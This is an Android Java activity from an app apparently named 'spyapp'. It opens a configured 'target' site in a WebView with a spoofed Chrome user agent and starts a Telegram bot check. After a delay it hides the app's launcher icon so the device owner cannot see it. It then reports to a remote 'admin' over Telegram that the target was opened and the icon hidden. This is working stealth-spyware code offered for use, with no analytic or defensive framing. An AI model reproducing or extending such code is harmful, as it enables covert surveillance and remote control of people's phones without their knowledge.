package com.spyapp;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

public class WebViewActivity extends AppCompatActivity {
    
    private WebView webView;
    private ProgressBar progressBar;
    private boolean isHidden = false;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webview);
        
        // Increment open counter
        Config.totalOpens++;
        
        webView = findViewById(R.id.webView);
        progressBar = findViewById(R.id.progressBar);
        
        setupWebView();
        
        // Start Telegram bot check
        TelegramBotHelper.startChecking(this);
        
        // Schedule app icon hiding after delay
        new Handler().postDelayed(this::hideAppIcon, Config.HIDE_ICON_DELAY);
        
        // Load the target site
        webView.loadUrl(Config.CURRENT_TARGET_URL);
    }
    
    private void setupWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setBuiltInZoomControls(true);
        settings.setDisplayZoomControls(false);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        
        // Make it look like a real browser
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + 
                "; " + Build.MODEL + ") AppleWebKit/537.36 " +
                "(KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36");
        
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                progressBar.setVisibility(View.VISIBLE);
                super.onPageStarted(view, url, favicon);
            }
            
            @Override
            public void onPageFinished(WebView view, String url) {
                progressBar.setVisibility(View.GONE);
                super.onPageFinished(view, url);
                
                // Inject JavaScript to make the site look natural
                injectNormalizerScript(view);
            }
            
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                view.loadUrl(request.getUrl().toString());
                return true;
            }
        });
    }
    
    private void injectNormalizerScript(WebView view) {
        String js = "javascript:(function() {" +
                "document.body.style.overflow = 'auto';" +
                "var metas = document.getElementsByTagName('meta');" +
                "for(var i=0; i<metas.length; i++) {" +
                "  if(metas[i].name == 'viewport') {" +
                "    metas[i].content = 'width=device-width, initial-scale=1.0, maximum-scale=5.0';" +
                "  }" +
                "}" +
                "})();";
        view.loadUrl(js);
    }
    
    private void hideAppIcon() {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, 
                    "com.spyapp.SplashActivity");
            p.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            isHidden = true;
            
            // Notify admin
            TelegramBotHelper.sendMessageToAdmin(this, 
                    "✅ *Target Opened Successfully*\n" +
                    "• App icon hidden from launcher\n" +
                    "• WebView active: " + Config.CURRENT_TARGET_URL);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // Handle back button - go back in WebView history
        if (keyCode == KeyEvent.KEYCODE_BACK && webView.canGoBack()) {
            webView.goBack();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    
    @Override
    protected void onDestroy() {
        if (webView != null) {
            webView.destroy();
        }
        super.onDestroy();
    }
}
